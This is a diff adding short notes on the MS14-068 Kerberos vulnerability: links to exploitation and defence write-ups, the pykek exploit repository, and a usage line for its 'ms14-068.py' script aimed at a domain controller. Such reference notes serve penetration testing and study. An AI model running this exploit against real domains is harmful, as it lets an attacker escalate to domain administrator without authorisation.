@@ -1,0 +1,8 @@
+https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/
+https://www.trustedsec.com/december-2014/ms14-068-full-compromise-step-step/
+http://www.liatsisfotis.com/2015/11/knock-and-pass-kerberos-exploitation.html
+https://compsecdirect.com/wp-content/uploads/2014/12/ms14-068-How-To.txt
+
+https://github.com/bidord/pykek
+
+ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>
